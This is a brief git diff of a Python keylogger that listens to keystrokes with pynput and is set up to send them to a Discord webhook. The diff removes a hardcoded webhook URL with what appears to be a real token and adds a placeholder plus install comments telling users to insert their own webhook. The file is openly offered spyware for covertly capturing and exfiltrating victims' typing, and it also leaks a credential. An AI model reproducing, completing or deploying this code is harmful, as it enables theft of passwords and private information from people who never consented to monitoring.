@@ -1,7 +1,7 @@
-from pynput.keyboard import Listener
-from discord_webhook import DiscordWebhook, DiscordEmbed
+from pynput.keyboard import Listener #pip install pynput
+from discord_webhook import DiscordWebhook, DiscordEmbed #pip install discord-webhook
 
-hook = "https://discord.com/api/webhooks/920869229421527090/mG6IZA9jo8cQoytlHAp5waPTIjNah1VzMP4mM3UwMjEtQTMEY97fw9Ju8MNoTukvoLWA"
+hook = "" #put ur webhook in the  "" 
 
 def writefile(key):
     try:
